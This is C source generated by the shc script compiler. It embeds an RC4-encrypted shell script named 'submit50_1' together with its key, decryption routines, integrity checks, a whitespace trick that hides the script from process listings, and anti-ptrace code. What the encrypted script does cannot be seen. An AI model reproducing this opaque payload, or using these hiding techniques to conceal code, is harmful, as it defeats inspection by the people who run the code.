#if 0
	shc Version 3.8.9b, Generic Script Compiler
	Copyright (c) 1994-2015 Francisco Rosales <frosal@fi.upm.es>

	shc -r -T -f ./submit50_1 
#endif

static  char data [] = 
#define      msg2_z	19
#define      msg2	((&data[2]))
	"\326\242\024\060\231\206\352\234\152\023\277\013\165\066\036\245"
	"\163\364\134\130\360\022\124\314\216"
#define      xecc_z	15
#define      xecc	((&data[28]))
	"\110\237\044\277\171\021\147\322\123\155\030\264\174\173\034\021"
	"\031\211\124"
#define      inlo_z	3
#define      inlo	((&data[44]))
	"\041\344\360"
#define      text_z	3040
#define      text	((&data[587]))
	"\011\063\303\036\236\011\254\144\006\124\355\327\052\217\352\176"
	"\134\170\333\041\340\044\301\005\171\014\131\331\340\017\331\352"
	"\102\235\010\341\246\264\105\254\011\063\204\063\302\157\262\037"
	"\350\215\100\311\261\001\316\053\015\050\004\356\067\335\330\171"
	"\173\341\133\041\226\241\316\237\324\123\322\226\302\205\266\252"
	"\023\366\164\305\367\102\360\005\152\364\364\241\322\314\033\115"
	"\255\167\156\103\030\075\343\355\220\266\204\123\073\072\376\116"
	"\060\162\023\047\264\003\055\037\370\041\301\312\356\335\027\233"
	"\124\206\337\155\303\303\132\124\171\336\247\264\030\245\002\110"
	"\027\026\160\314\032\236\353\022\277\255\334\255\212\363\111\337"
	"\172\051\114\075\354\247\222\145\205\071\031\236\336\034\347\366"
	"\063\130\302\115\366\256\137\265\134\074\143\346\060\254\306\252"
	"\325\023\350\302\272\172\047\100\263\101\337\222\136\306\211\221"
	"\036\113\337\025\372\077\312\126\173\056\075\253\332\004\126\260"
	"\027\076\163\321\270\232\022\153\334\361\376\072\270\207\314\326"
	"\323\254\353\316\353\266\045\147\345\143\023\300\147\151\161\176"
	"\247\344\120\140\176\143\314\133\124\312\225\014\122\142\343\045"
	"\016\317\363\372\206\031\141\153\174\165\053\343\337\235\141\207"
	"\201\262\347\377\025\263\132\152\176\360\166\320\123\132\366\141"
	"\052\351\134\260\003\276\034\177\063\110\142\022\345\304\232\146"
	"\167\201\146\214\065\301\366\263\262\155\203\005\310\172\147\362"
	"\144\303\242\147\201\277\346\265\007\111\310\354\016\142\122\205"
	"\343\270\022\031\172\011\314\054\167\120\061\077\312\230\062\056"
	"\134\324\225\335\223\174\223\233\306\133\207\324\275\331\132\241"
	"\222\154\272\014\166\207\071\355\327\152\055\242\003\137\321\137"
	"\064\146\074\310\343\320\143\251\053\352\176\351\304\330\212\126"
	"\105\105\143\273\314\234\251\244\007\326\106\012\065\027\151\152"
	"\176\246\062\142\166\225\013\241\177\212\213\103\142\025\232\250"
	"\133\376\143\047\233\014\314\242\343\022\254\031\052\025\203\251"
	"\274\265\013\062\112\027\324\311\241\137\015\004\165\247\254\320"
	"\245\020\370\100\034\304\343\000\326\217\031\001\245\234\252\141"
	"\122\266\224\234\315\150\146\157\310\163\163\075\033\040\015\301"
	"\060\005\002\114\312\345\115\240\165\146\242\032\003\114\174\125"
	"\002\021\362\320\172\130\077\102\314\263\177\347\116\253\003\060"
	"\316\035\247\122\167\027\165\335\200\050\075\052\042\250\365\032"
	"\377\170\222\376\346\223\032\140\070\220\371\254\021\244\051\275"
	"\323\132\345\247\022\103\235\010\061\015\326\173\377\173\243\211"
	"\254\146\235\246\040\320\142\043\270\351\230\065\321\267\346\202"
	"\014\213\236\253\243\330\340\100\056\107\225\252\045\102\167\221"
	"\337\157\001\204\300\205\036\166\307\037\204\133\352\144\317\332"
	"\043\016\222\126\242\371\070\146\046\337\160\207\152\230\133\260"
	"\215\103\336\236\242\103\210\145\015\106\366\226\361\232\172\203"
	"\060\067\027\203\172\333\156\377\271\147\204\000\261\341\353\346"
	"\156\021\267\120\144\123\004\246\354\324\267\151\342\361\075\312"
	"\042\163\160\301\376\231\353\046\113\035\066\001\231\234\223\064"
	"\012\062\126\052\322\023\023\336\225\367\305\017\127\225\040\043"
	"\032\041\252\127\142\374\246\342\215\377\173\166\266\142\037\035"
	"\164\104\221\114\332\017\212\231\136\315\276\266\072\336\007\231"
	"\207\242\336\103\170\313\273\124\355\152\117\077\024\334\321\002"
	"\161\223\367\316\110\156\315\054\255\102\142\215\244\311\072\266"
	"\342\367\320\012\227\057\067\273\113\226\256\252\122\150\366\051"
	"\363\260\001\241\116\314\245\111\166\037\371\301\012\213\015\371"
	"\265\216\320\341\142\277\010\205\250\276\100\174\236\171\130\170"
	"\112\072\223\174\255\306\047\063\142\376\257\240\173\054\375\252"
	"\252\353\256\365\104\133\211\255\250\231\325\114\157\252\262\137"
	"\121\267\274\166\035\263\302\052\105\034\336\244\154\211\037\344"
	"\112\263\327\243\164\231\217\232\040\111\317\036\017\110\223\005"
	"\013\153\042\075\323\047\102\337\116\144\221\216\362\246\317\122"
	"\370\037\345\125\117\256\130\007\232\122\147\104\032\060\061\161"
	"\055\163\057\117\353\131\274\315\124\150\215\341\302\147\042\123"
	"\117\326\121\355\114\071\106\222\236\167\172\115\152\127\233\130"
	"\131\221\347\151\041\123\200\220\071\075\345\237\061\040\144\205"
	"\240\011\333\223\376\320\374\342\204\374\215\272\033\255\052\254"
	"\054\313\334\070\047\175\002\216\364\304\345\124\376\213\243\036"
	"\020\155\000\314\011\014\001\163\330\346\011\302\236\306\266\140"
	"\363\032\224\335\343\347\310\061\005\133\176\102\341\267\053\150"
	"\041\324\300\120\363\237\210\246\060\140\052\270\336\175\021\274"
	"\163\275\162\356\042\222\044\043\373\205\027\244\301\202\027\246"
	"\367\022\241\103\070\340\067\170\246\327\063\313\343\244\062\150"
	"\273\311\246\133\055\007\111\374\333\243\373\266\303\100\227\075"
	"\271\243\025\150\251\212\060\277\152\127\164\306\203\012\237\274"
	"\205\143\024\166\276\111\240\245\373\142\001\332\134\043\231\026"
	"\022\336\222\256\253\214\374\255\125\047\077\130\341\031\300\052"
	"\077\232\042\307\023\142\000\260\207\103\043\306\164\057\376\146"
	"\320\255\352\307\104\067\202\165\011\145\061\247\361\176\247\272"
	"\147\371\276\175\145\122\100\262\173\016\144\210\057\241\143\076"
	"\175\361\116\073\252\236\224\366\234\066\262\376\105\215\357\001"
	"\175\254\322\323\377\235\213\206\051\014\306\365\037\375\356\225"
	"\361\071\160\107\266\237\351\252\167\273\233\065\336\143\053\206"
	"\316\303\237\135\275\126\030\233\165\031\114\027\344\122\254\115"
	"\065\334\033\346\132\372\324\274\003\076\364\347\022\370\235\020"
	"\062\305\031\063\367\330\062\055\302\054\306\341\176\131\034\040"
	"\350\230\206\267\007\063\237\174\372\353\023\012\015\030\124\330"
	"\207\135\126\265\122\236\236\216\031\212\235\205\152\271\076\222"
	"\310\062\377\223\316\367\364\307\322\244\071\040\253\070\217\263"
	"\206\301\253\346\372\335\204\350\360\374\124\052\062\007\104\311"
	"\223\103\370\253\364\326\304\162\045\325\330\235\014\036\263\323"
	"\310\134\200\206\030\062\026\054\023\025\300\375\001\114\321\326"
	"\323\043\117\035\103\135\315\223\212\163\147\116\010\364\311\116"
	"\032\316\335\003\072\375\052\374\366\320\316\114\051\322\024\071"
	"\271\245\112\157\132\113\132\214\177\006\053\074\013\321\320\357"
	"\034\240\076\250\214\217\027\203\123\360\171\261\226\123\061\245"
	"\026\016\015\002\303\025\043\353\375\271\367\175\300\021\022\367"
	"\017\331\102\257\106\136\366\124\323\244\345\130\253\261\143\221"
	"\213\230\002\216\366\254\314\077\216\242\114\006\325\023\063\122"
	"\237\041\105\224\306\007\345\104\221\306\221\052\237\214\026\374"
	"\267\067\270\065\027\023\263\322\254\365\240\353\016\147\355\005"
	"\022\200\034\136\356\231\046\101\136\070\020\337\250\014\366\143"
	"\357\246\062\014\243\136\070\253\336\246\202\355\244\072\226\260"
	"\075\063\070\306\006\243\361\207\356\166\275\254\113\375\134\136"
	"\040\373\315\012\126\240\221\004\131\263\326\216\372\144\215\232"
	"\257\102\251\232\115\124\272\002\045\073\327\300\225\356\322\143"
	"\331\267\272\123\123\015\152\017\001\076\043\153\271\026\240\360"
	"\112\051\342\054\031\237\175\366\023\131\252\347\377\260\201\014"
	"\104\055\142\312\314\017\052\115\205\252\067\373\144\255\255\272"
	"\371\036\274\301\022\010\251\325\201\305\027\210\252\112\010\123"
	"\123\001\310\104\047\121\075\137\020\205\354\033\047\100\335\036"
	"\116\233\260\123\150\341\243\302\325\121\006\036\145\147\221\335"
	"\112\152\051\164\250\255\026\120\222\024\223\175\343\161\327\255"
	"\221\106\014\142\220\163\106\333\254\223\334\175\251\314\354\330"
	"\174\331\044\330\123\324\270\126\016\127\301\306\337\363\171\256"
	"\237\073\261\306\307\046\032\137\136\062\250\205\226\101\073\131"
	"\101\242\106\310\344\006\362\310\256\034\036\131\057\356\065\326"
	"\337\013\343\262\051\376\223\301\376\065\115\026\060\316\076\245"
	"\327\106\075\001\122\261\005\032\025\013\017\252\034\142\073\176"
	"\311\316\314\076\226\111\240\164\106\055\306\313\075\071\227\344"
	"\004\252\330\352\071\337\326\276\077\334\214\154\274\062\042\232"
	"\125\113\004\316\147\107\234\251\120\013\337\107\036\374\007\114"
	"\126\132\175\052\043\061\144\225\102\032\115\343\044\205\006\313"
	"\272\151\051\343\151\356\110\376\050\150\030\103\217\201\013\242"
	"\334\346\173\056\113\312\350\101\301\357\237\222\133\215\140\121"
	"\261\350\176\121\370\024\365\077\004\145\350\306\133\356\315\010"
	"\275\233\226\207\304\067\140\274\075\271\272\133\344\104\140\245"
	"\076\005\111\155\142\337\044\122\242\276\154\221\042\326\122\174"
	"\047\006\367\233\316\124\010\032\062\246\034\325\246\136\066\312"
	"\007\245\107\127\147\161\021\344\240\306\250\262\352\176\014\224"
	"\212\140\256\137\275\010\101\163\314\007\035\306\240\044\156\000"
	"\073\134\021\064\342\065\003\335\047\353\114\143\242\204\301\060"
	"\115\111\145\126\352\062\163\222\207\017\315\313\023\251\073\015"
	"\132\313\346\174\220\064\377\325\251\230\212\137\325\300\127\202"
	"\070\301\103\305\164\260\021\362\364\217\251\254\115\215\333\334"
	"\350\272\322\166\302\111\074\037\102\173\372\141\307\275\324\231"
	"\170\155\216\147\064\312\026\074\207\261\115\037\141\357\100\107"
	"\343\130\100\340\067\032\127\053\034\247\102\116\044\027\321\057"
	"\015\204\023\100\321\117\020\011\164\065\307\252\164\267\201\116"
	"\067\005\357\242\366\226\010\246\375\004\355\302\136\112\201\215"
	"\362\254\204\232\015\105\270\105\107\251\047\047\054\221\307\171"
	"\362\303\065\046\370\141\361\240\353\256\107\024\225\024\276\304"
	"\051\024\024\260\173\366\346\136\141\026\250\310\167\121\262\003"
	"\162\350\121\320\274\074\112\233\201\075\361\332\302\011\247\117"
	"\277\261\124\206\030\124\143\037\152\137\107\354\261\225\210\074"
	"\006\276\147\221\372\315\215\126\201\226\044\331\130\150\015\125"
	"\177\211\102\202\062\222\007\037\230\117\246\111\213\241\346\147"
	"\136\375\263\244\224\275\016\315\053\310\017\140\222\006\217\330"
	"\357\140\052\243\262\357\154\041\174\216\037\343\113\116\170\113"
	"\276\141\216\034\317\301\216\024\312\227\256\152\014\336\116\143"
	"\224\312\025\202\340\214\210\112\301\236\112\335\035\210\046\124"
	"\141\040\133\121\164\045\305\220\213\116\362\037\076\161\115\257"
	"\211\141\034\247\156\367\145\021\376\215\256\020\204\236\063\346"
	"\015\030\044\222\350\006\355\065\314\150\257\205\236\026\301\004"
	"\211\312\337\177\264\341\336\160\106\053\121\357\221\171\375\254"
	"\056\145\215\242\216\340\132\271\051\055\033\213\134\070\212\222"
	"\270\334\335\112\375\054\030\020\301\214\064\301\371\100\222\126"
	"\147\075\030\362\307\031\107\313\265\244\116\030\014\335\372\312"
	"\041\360\346\057\336\264\057\356\252\354\260\270\203\015\331\055"
	"\216\053\177\120\072\025\043\050\150\360\057\177\221\211\076\033"
	"\025\141\337\214\244\065\027\111\010\064\323\137\367\243\016\055"
	"\204\322\267\253\201\125\260\123\043\143\113\270\213\141\003\241"
	"\264\315\120\117\246\103\332\303\004\211\027\043\254\217\222\000"
	"\062\207\371\205\045\204\123\010\303\275\116\114\277\136\111\160"
	"\252\272\025\344\131\362\165\350\354\365\257\213\212\270\174\224"
	"\110\000\232\017\123\252\227\305\212\171\057\266\356\112\216\146"
	"\322\107\345\314\040\163\217\246\364\057\012\164\011\122\257\147"
	"\211\224\031\133\363\141\241\364\172\200\171\220\226\234\314\062"
	"\322\155\152\337\323\341\164\245\126\120\221\261\063\252\365\345"
	"\060\256\347\066\124\050\350\361\301\330\141\336\137\034\267\003"
	"\040\063\132\115\366\301\241\157\162\367\244\264\011\065\221\375"
	"\066\317\300\136\354\054\371\315\252\232\364\241\024\216\116\110"
	"\076\163\204\122\171\300\011\167\127\202\310\325\374\174\067\011"
	"\040\117\030\157\222\067\060\214\315\365\070\135\064\103\152\271"
	"\143\377\113\336\210\016\112\016\057\316\140\220\172\303\374\357"
	"\103\301\000\265\307\321\034\067\047\204\077\344\166\133\346\036"
	"\346\273\273\337\350\350\265\233\032\354\242\005\167\176\215\130"
	"\067\065\167\037\012\131\272\241\246\320\064\306\371\163\302\316"
	"\206\245\213\123\362\011\202\067\355\107\036\201\077\203\200\354"
	"\146\221\302\201\303\176\111\047\016\030\364\265\045\011\011\110"
	"\043\215\066\106\011\207\072\315\361\172\314\056\156\005\212\366"
	"\030\154\213\274\060\350\167\141\306\262\045\205\073\107\130\075"
	"\335\302\223\201\040\215\154\136\151\276\201\375\272\076\056\373"
	"\111\076\217\077\015\226\064\314\054\276\244\152\063\123\326\174"
	"\226\235\342\227\340\172\037\042\311\034\311\244\216\371\334\345"
	"\127\314\242\371\266\053\030\152\153\271\374\230\011\325\247\272"
	"\113\225\340\352\071\272\310\143\221\042\107\057\326\364\054\367"
	"\314\102\203\067\051\162\163\205\121\041\146\034\073\311\202\226"
	"\255\204\050\235\057\274\155\127\142\031\372\010\107\310\040\220"
	"\142\057\046\034\330\266\277\267\327\016\264\373\255\271\077\146"
	"\311\252\157\366\354\222\007\306\012\266\371\363\052\113\337\017"
	"\131\140\050\242\272\027\157\325\332\142\244\304\372\065\342\111"
	"\066\375\147\067\311\244\212\266\141\043\240\002\334\200\035\126"
	"\046\043\024\060\064\011\053\376\061\115\336\310\107\325\013\131"
	"\246\230\040\372\064\174\327\250\135\075\015\206\217\363\321\253"
	"\121\274\120\365\060\030\246\156\255\066\107\277\335\111\272\042"
	"\110\330\257\325\264\325\310\257\274\150\117\062\333\245\022\135"
	"\356\126\174\317\302\034\040\156\263\217\207\015\077\154\337\177"
	"\214\133\237\300\356\374\127\344\131\175\214\241\243\336\353\254"
	"\261\356\063\125\316\022\166\235\246\114\041\064\277\231\226\024"
	"\330\144\264\241\164\052\055\247\313\315\147\303\132\015\237\247"
	"\306\047\151\077\250\371\147\222\222\237\243\140\332\160\266\100"
	"\376\011\341\324\077\014\157\263\265\143\112\016\267\304\244\146"
	"\335\031\160\103\174\254\020\162\305\057\164\011\303\334\120\032"
	"\326\220\030\134\074\004\004\345\105\036\041\134\236\063\175\261"
	"\102\021\065\223\251\142\343\121\230\034\116\167\003\365\215\065"
	"\012\242\045\134\364\214\356\276\302\070\115\372\304\316\341\053"
	"\215\336\322\123\132\135\034\213\023\041\172\046\000\166\227\356"
	"\172\322\330\355\346\320\127\253\240\061\152\332\044\270\346\276"
	"\220\117\271\026\147\005\202\064\176\135\326\333\015\354\200\322"
	"\200\242\001\212\040\052\236\177\103\371\231\353\204\022\350\051"
	"\053\332\375\115\217\236\302\233\374\147\156\217\367\031\067\027"
	"\113\044\176\336\101\251\212\313\215\151\336\305\204\260\227\064"
	"\205\123\370\266\027\022\200\350\033\204\252\315\011\151\140\366"
	"\263\000\332\261\200\215\230\253\023\265\140\011\252\174\167\337"
	"\260\316\150\042\063\176\257\353\071\277\132\164\225\305\337\362"
	"\365\056\361\255\240\316\321\260\027\355\227\105\077\177\326\151"
	"\156\264\212\254\352\225\172\063\056\135\125\027\166\327\206\041"
	"\104\270\202\317\117\150\022\041\065\031\133\134\074\135\275\320"
	"\176\104\340\343\274\277\317\253\103\337\336\066\266\351\055\351"
	"\351\225\253\274\117\010\322\342\357\206\316\157\146\202\211\246"
	"\371\034\201\265\270\244\065\141\036\027\072\207\027\004\163\334"
	"\350\270\177\334\217\264\221\250\356\346\062\306\311\001\232\232"
	"\330\300\104\012\303\342\041\064\322\174\063\022\226\361\172\160"
	"\021\017\206\353\256\330\022\371\045\260\316\210\062\043\007\210"
	"\024\000\235\350\102\262\126\127\325\333\277\017\366\226\323\030"
	"\231\134\357\077\053\205\063\005\245\073\047\352\335\226\024\062"
	"\003\357\032\101\237\374\237\272\112\232\312\216\323"
#define      chk1_z	22
#define      chk1	((&data[3631]))
	"\222\253\120\257\025\120\265\321\162\007\222\064\321\344\261\063"
	"\017\010\167\005\340\334\331\134\107"
#define      lsto_z	1
#define      lsto	((&data[3653]))
	"\336"
#define      chk2_z	19
#define      chk2	((&data[3654]))
	"\204\361\343\267\302\044\353\176\166\151\247\337\332\020\300\033"
	"\021\036\201"
#define      rlax_z	1
#define      rlax	((&data[3673]))
	"\172"
#define      tst2_z	19
#define      tst2	((&data[3677]))
	"\360\257\120\225\036\353\251\067\320\267\252\057\242\035\034\140"
	"\124\230\033\330\236\264\300"
#define      date_z	1
#define      date	((&data[3697]))
	"\310"
#define      tst1_z	22
#define      tst1	((&data[3700]))
	"\353\136\304\272\341\365\222\071\120\237\111\371\373\060\061\320"
	"\277\367\160\004\133\303\325\335\206\170\007\212"
#define      pswd_z	256
#define      pswd	((&data[3771]))
	"\150\104\170\145\112\174\006\154\204\363\012\342\343\271\063\244"
	"\343\335\244\116\123\127\071\262\336\261\271\151\275\155\103\045"
	"\261\273\213\374\070\221\150\275\204\162\240\147\054\304\163\071"
	"\147\047\213\133\210\122\215\047\311\151\025\300\156\041\256\172"
	"\151\344\335\226\232\045\326\246\253\223\001\344\127\165\036\277"
	"\234\252\032\045\374\247\115\306\020\143\206\177\205\065\371\356"
	"\031\327\204\263\374\132\132\247\355\134\214\105\321\252\004\156"
	"\124\036\224\121\306\341\027\327\104\236\126\311\324\120\267\355"
	"\047\073\241\044\226\373\313\204\127\130\312\051\003\316\230\130"
	"\355\054\251\263\015\301\212\122\140\341\033\064\061\323\041\130"
	"\016\302\175\245\276\111\052\026\241\364\100\244\302\330\374\260"
	"\005\246\143\022\150\356\145\311\317\200\376\000\123\037\131\142"
	"\342\326\010\241\040\062\267\301\047\370\146\351\320\143\231\325"
	"\011\375\350\162\353\116\073\273\316\071\274\042\131\026\205\074"
	"\354\216\336\015\301\226\316\350\216\064\322\137\227\154\064\241"
	"\151\035\024\125\153\120\021\072\211\315\135\343\343\343\040\320"
	"\161\376\335\063\224\253\033\043\340\355\202\170\131\267\032\303"
	"\324\056\031\100\176\052\173\010\367\331\353\333\275\014\253\056"
	"\013\210\142\240\064\175\303\025\153\105\215\305\374\324\013\017"
	"\261\260\136\005\010\230\267\346\112\161\117\007\337\223\054\220"
	"\117\267\215\210\110\365\105\315\150\346\064\224\272\100\244\154"
	"\361\002\162\371\232\052\340\345\234\060\354\173\303\030\014\023"
	"\317\231\234\030"
#define      opts_z	1
#define      opts	((&data[4082]))
	"\373"
#define      msg1_z	42
#define      msg1	((&data[4091]))
	"\213\203\133\057\357\114\062\141\005\101\301\302\171\235\175\051"
	"\301\330\115\256\206\056\217\054\163\337\237\151\274\342\074\107"
	"\164\157\054\304\361\242\223\157\103\240\357\043\112\036\160\166"
	"\274\014\105"
#define      shll_z	10
#define      shll	((&data[4135]))
	"\262\065\004\076\125\352\034\233\120\266\256"/* End of data[] */;
#define      hide_z	4096
#define DEBUGEXEC	0	/* Define as 1 to debug execvp calls */
#define TRACEABLE	1	/* Define as 1 to enable ptrace the executable */

/* rtc.c */

#include <sys/stat.h>
#include <sys/types.h>

#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

/* 'Alleged RC4' */

static unsigned char stte[256], indx, jndx, kndx;

/*
 * Reset arc4 stte. 
 */
void stte_0(void)
{
	indx = jndx = kndx = 0;
	do {
		stte[indx] = indx;
	} while (++indx);
}

/*
 * Set key. Can be used more than once. 
 */
void key(void * str, int len)
{
	unsigned char tmp, * ptr = (unsigned char *)str;
	while (len > 0) {
		do {
			tmp = stte[indx];
			kndx += tmp;
			kndx += ptr[(int)indx % len];
			stte[indx] = stte[kndx];
			stte[kndx] = tmp;
		} while (++indx);
		ptr += 256;
		len -= 256;
	}
}

/*
 * Crypt data. 
 */
void arc4(void * str, int len)
{
	unsigned char tmp, * ptr = (unsigned char *)str;
	while (len > 0) {
		indx++;
		tmp = stte[indx];
		jndx += tmp;
		stte[indx] = stte[jndx];
		stte[jndx] = tmp;
		tmp += stte[indx];
		*ptr ^= stte[tmp];
		ptr++;
		len--;
	}
}

/* End of ARC4 */

/*
 * Key with file invariants. 
 */
int key_with_file(char * file)
{
	struct stat statf[1];
	struct stat control[1];

	if (stat(file, statf) < 0)
		return -1;

	/* Turn on stable fields */
	memset(control, 0, sizeof(control));
	control->st_ino = statf->st_ino;
	control->st_dev = statf->st_dev;
	control->st_rdev = statf->st_rdev;
	control->st_uid = statf->st_uid;
	control->st_gid = statf->st_gid;
	control->st_size = statf->st_size;
	control->st_mtime = statf->st_mtime;
	control->st_ctime = statf->st_ctime;
	key(control, sizeof(control));
	return 0;
}

#if DEBUGEXEC
void debugexec(char * sh11, int argc, char ** argv)
{
	int i;
	fprintf(stderr, "shll=%s\n", sh11 ? sh11 : "<null>");
	fprintf(stderr, "argc=%d\n", argc);
	if (!argv) {
		fprintf(stderr, "argv=<null>\n");
	} else { 
		for (i = 0; i <= argc ; i++)
			fprintf(stderr, "argv[%d]=%.60s\n", i, argv[i] ? argv[i] : "<null>");
	}
}
#endif /* DEBUGEXEC */

void rmarg(char ** argv, char * arg)
{
	for (; argv && *argv && *argv != arg; argv++);
	for (; argv && *argv; argv++)
		*argv = argv[1];
}

int chkenv(int argc)
{
	char buff[512];
	unsigned long mask, m;
	int l, a, c;
	char * string;
	extern char ** environ;

	mask  = (unsigned long)&chkenv;
	mask ^= (unsigned long)getpid() * ~mask;
	sprintf(buff, "x%lx", mask);
	string = getenv(buff);
#if DEBUGEXEC
	fprintf(stderr, "getenv(%s)=%s\n", buff, string ? string : "<null>");
#endif
	l = strlen(buff);
	if (!string) {
		/* 1st */
		sprintf(&buff[l], "=%lu %d", mask, argc);
		putenv(strdup(buff));
		return 0;
	}
	c = sscanf(string, "%lu %d%c", &m, &a, buff);
	if (c == 2 && m == mask) {
		/* 3rd */
		rmarg(environ, &string[-l - 1]);
		return 1 + (argc - a);
	}
	return -1;
}

#if !defined(TRACEABLE)

#define _LINUX_SOURCE_COMPAT
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <unistd.h>

#if !defined(PTRACE_ATTACH) && defined(PT_ATTACH)
#	define PTRACE_ATTACH	PT_ATTACH
#endif
void untraceable(char * argv0)
{
	char proc[80];
	int pid, mine;

	switch(pid = fork()) {
	case  0:
		pid = getppid();
		/* For problematic SunOS ptrace */
#if defined(__FreeBSD__)
		sprintf(proc, "/proc/%d/mem", (int)pid);
#else
		sprintf(proc, "/proc/%d/as",  (int)pid);
#endif
		close(0);
		mine = !open(proc, O_RDWR|O_EXCL);
		if (!mine && errno != EBUSY)
			mine = !ptrace(PTRACE_ATTACH, pid, 0, 0);
		if (mine) {
			kill(pid, SIGCONT);
		} else {
			perror(argv0);
			kill(pid, SIGKILL);
		}
		_exit(mine);
	case -1:
		break;
	default:
		if (pid == waitpid(pid, 0, 0))
			return;
	}
	perror(argv0);
	_exit(1);
}
#endif /* !defined(TRACEABLE) */

char * xsh(int argc, char ** argv)
{
	char * scrpt;
	int ret, i, j;
	char ** varg;
	char * me = argv[0];

	stte_0();
	 key(pswd, pswd_z);
	arc4(msg1, msg1_z);
	arc4(date, date_z);
	if (date[0] && (atoll(date)<time(NULL)))
		return msg1;
	arc4(shll, shll_z);
	arc4(inlo, inlo_z);
	arc4(xecc, xecc_z);
	arc4(lsto, lsto_z);
	arc4(tst1, tst1_z);
	 key(tst1, tst1_z);
	arc4(chk1, chk1_z);
	if ((chk1_z != tst1_z) || memcmp(tst1, chk1, tst1_z))
		return tst1;
	ret = chkenv(argc);
	arc4(msg2, msg2_z);
	if (ret < 0)
		return msg2;
	varg = (char **)calloc(argc + 10, sizeof(char *));
	if (!varg)
		return 0;
	if (ret) {
		arc4(rlax, rlax_z);
		if (!rlax[0] && key_with_file(shll))
			return shll;
		arc4(opts, opts_z);
		arc4(text, text_z);
		arc4(tst2, tst2_z);
		 key(tst2, tst2_z);
		arc4(chk2, chk2_z);
		if ((chk2_z != tst2_z) || memcmp(tst2, chk2, tst2_z))
			return tst2;
		/* Prepend hide_z spaces to script text to hide it. */
		scrpt = malloc(hide_z + text_z);
		if (!scrpt)
			return 0;
		memset(scrpt, (int) ' ', hide_z);
		memcpy(&scrpt[hide_z], text, text_z);
	} else {			/* Reexecute */
		if (*xecc) {
			scrpt = malloc(512);
			if (!scrpt)
				return 0;
			sprintf(scrpt, xecc, me);
		} else {
			scrpt = me;
		}
	}
	j = 0;
	varg[j++] = argv[0];		/* My own name at execution */
	if (ret && *opts)
		varg[j++] = opts;	/* Options on 1st line of code */
	if (*inlo)
		varg[j++] = inlo;	/* Option introducing inline code */
	varg[j++] = scrpt;		/* The script itself */
	if (*lsto)
		varg[j++] = lsto;	/* Option meaning last option */
	i = (ret > 1) ? ret : 0;	/* Args numbering correction */
	while (i < argc)
		varg[j++] = argv[i++];	/* Main run-time arguments */
	varg[j] = 0;			/* NULL terminated array */
#if DEBUGEXEC
	debugexec(shll, j, varg);
#endif
	execvp(shll, varg);
	return shll;
}

int main(int argc, char ** argv)
{
#if DEBUGEXEC
	debugexec("main", argc, argv);
#endif
	argv[1] = xsh(argc, argv);
	fprintf(stderr, "%s%s%s: %s\n", argv[0],
		errno ? ": " : "",
		errno ? strerror(errno) : "",
		argv[1] ? argv[1] : "<null>"
	);
	return 1;
}
